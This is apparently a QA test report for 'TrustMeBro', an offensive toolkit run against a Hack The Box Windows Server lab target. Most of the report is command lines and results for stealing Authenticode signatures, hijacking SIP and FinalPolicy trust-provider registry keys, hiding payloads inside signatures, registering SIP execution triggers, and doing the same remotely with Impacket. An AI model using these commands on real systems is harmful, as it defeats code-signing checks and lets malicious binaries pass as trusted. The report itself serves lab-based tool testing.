# QA Report

Target: HTB Windows Server 2019 (10.129.204.178, build 17763)
Date: 2026-07-04
Tester: Automated via SSH

## Summary

| Category | Count |
|---|---|
| Pass | 26 |
| Fail (fixed during QA) | 3 |
| Known Limitation | 2 |
| Gap (C++ vs Python) | 3 |

## Pass

| Block | Test | Command | Notes |
|---|---|---|---|
| 1.1 | steal | `TrustMeBro.exe steal explorer.exe agent.exe` | Signature stolen, Get-AuthenticodeSignature returns Valid |
| 1.2 | steal --clone | `TrustMeBro.exe steal explorer.exe agent.exe --clone` | FileDescription changed from Notepad to Windows Explorer |
| 1.3 | No registry writes | reg query after steal | SIP Dll still WINTRUST.DLL |
| 2.1 | SIP hijack PE,PS,MSI | `TrustMeBro.exe hijack --sip-types PE,PowerShell,MSI` | All 3 GUIDs set to ntdll.dll |
| 2.5 | WOW64-only | `TrustMeBro.exe hijack --sip-types PE --wow64-only` | Native=WINTRUST, WOW64=ntdll |
| 2.6 | FinalPolicy hijack | `TrustMeBro.exe hijack --finalpolicy` | $Function set to SoftpubCleanup |
| 2.7 | FinalPolicy clean | `TrustMeBro.exe hijack --finalpolicy --clean` | $Function restored to SoftpubAuthenticode |
| 2.8 | Custom provider | `TrustMeBro.exe hijack --custom-provider {DEADBEEF-...}` | Key created with $DLL/$Function=SoftpubCleanup |
| 2.9 | Custom provider clean | `TrustMeBro.exe hijack --custom-provider {GUID} --clean` | Key deleted |
| 2.10 | Probe | `TrustMeBro.exe probe` | All 9 CI fields reported. Flags: 0x0000C001 |
| 2.11 | --dry-run removed | `TrustMeBro.exe hijack --sip-types PE --dry-run` | Flag not recognized, tool executed normally. Intentional removal. |
| 3.1 | Embed direct | `TrustMeBro.exe embed payload.bin explorer.exe output.exe` | 32 bytes embedded, signature Valid |
| 3.2 | Embed camouflage | `TrustMeBro.exe embed ... --camouflage` | SPC_NESTED_SIGNATURE OID used |
| 3.3 | Embed custom OID | `TrustMeBro.exe embed ... --oid 1.3.6.1.4.1.55555.1.1` | Custom OID used |
| 3.4 | Extract direct | `TrustMeBro.exe extract output.exe recovered.bin` | Byte-for-byte match |
| 3.5 | Extract camouflage | `TrustMeBro.exe extract ... --camouflage` | Byte-for-byte match |
| 3.6 | Double embed | Embed twice on same file | Overwrites cleanly, +0 bytes delta |
| 3.7 | Extract unsigned | Extract from notepad.exe | Graceful error: "PE has no embedded signature" |
| 4.1 | sip-exec install | `TrustMeBro.exe sip-exec install --dll ntdll.dll --guid pe` | GUID registered, undo command printed |
| 4.2 | sip-exec list | `TrustMeBro.exe sip-exec list` | Table shows all registered SIP triggers |
| 4.3 | sip-exec remove | `TrustMeBro.exe sip-exec remove --guid pe` | Entry removed |
| 4.4 | sip-exec --clean | `TrustMeBro.exe sip-exec --clean --guid vbscript` | Alternate syntax works |
| 6.1 | clean no flags | `TrustMeBro.exe clean` | Prints help, no writes |
| 6.2 | clean --all | `TrustMeBro.exe clean --all` | SIP + FinalPolicy restored |
| 9.1 | Python remote hijack | `TrustMeBro.py hijack ... --action hijack` | 3 GUIDs written via Impacket |
| 9.2 | Python remote finalpolicy | `TrustMeBro.py hijack ... --action finalpolicy` | $Function=SoftpubCleanup |
| 9.3 | Python remote fp clean | `TrustMeBro.py hijack ... --action finalpolicy-clean` | $Function=SoftpubAuthenticode |
| 9.4 | Python remote SIP clean | `TrustMeBro.py hijack ... --action clean` | All SIP keys restored |
| 11.1 | Python embed direct | `TrustMeBro.py embed ...` | 24 bytes embedded |
| 11.2 | Python embed camouflage | `TrustMeBro.py embed ... --camouflage` | SPC_NESTED_SIGNATURE used |
| 11.3 | Python extract direct | `TrustMeBro.py extract ...` | Byte-for-byte match |
| 11.4 | Python extract camo | `TrustMeBro.py extract ... --camouflage` | Byte-for-byte match |
| 11.5 | Python extract unsigned | Extract from non-PE file | "Not a PE file" |
| 11.6 | Python signer-index | `TrustMeBro.py embed ... --signer-index 0` | Roundtrip pass |

## Fail (Fixed During QA)

| Block | Test | Issue | Fix |
|---|---|---|---|
| ALL | C++ tool zero output over SSH | mingw libstdc++ DLLs not on target. Tool ran silently. | Added `-static` link flag. Also added `setvbuf(stdout/stderr, NULL, _IONBF, 0)`. |
| 2.6 | FinalPolicy not writing | Trust Provider keys use `$DLL`/`$Function`, tool wrote `Dll`/`FuncName` | Added `SetTrustProviderValues()` in steal.h, updated Python FINALPOLICY dicts. |
| 9.1 | Python remote hijack fails | Impacket reg.py does not support `-force` flag | Removed `-force` from `run_reg_cmd`. |

## Known Limitations

| Block | Item | Detail |
|---|---|---|
| 2.2 | ESD GUID ACCESS_DENIED | `{9F3053C5-...}` (EsdSip) returns Error 5 on Server 2019. This SIP key may not exist on all builds. 16 of 17 GUIDs write successfully. Non-blocking. |
| 10 | Python --local not tested | Target has no Python. --local mode uses winreg which requires running on a Windows machine with Python. Not testable on this HTB target. |

## Gaps (C++ vs Python)

| Feature | C++ | Python | Block |
|---|---|---|---|
| sip-exec list | Implemented. Enumerates all registered SIP triggers. | Not implemented. | 12.4 |
| sip-exec GUID alias resolution | `--guid pe` resolves to `{C689AAB8-...}` | `--guid pe` uses literal `{pe}` (BUG) | 12.2 |
| sip-exec execution | Writes registry directly | Prints reg.exe commands only (command generator) | 12.1 |
| Probe subcommand | Implemented | Not implemented | N/A |
| Clean subcommand | Standalone `clean --sip/--finalpolicy/--all` | Uses `--action clean` on hijack | N/A |

## Blocks Not Tested

| Block | Reason |
|---|---|
| 7 (INF hijack) | No TrustMeBro.inf on target. Would require transferring the INF and running rundll32. |
| 10 (Python local) | No Python on target. |
| 13 (SigStash) | Requires osslsigncode signing pipeline not available on target. |
| 14 (FormatGhost) | Requires building format_ghost.dll and a carrier PE with the OID. |

## Fix Priority

1. **P1**: Static C++ link must stay. Update Makefile/build docs to always use `-static`.
2. **P1**: `$DLL`/`$Function` fix is committed. Verify BOF header also uses correct value names.
3. **P1**: Python sip-exec `--guid` alias resolution. Currently uses literal string, should resolve like C++.
4. **P2**: Python sip-exec should write registry directly (like hijack does), not just print commands.
5. **P2**: Python sip-exec `list` subcommand missing.
6. **P3**: ESD GUID `{9F3053C5}` fails on some Windows builds. Add a try/continue with warning.
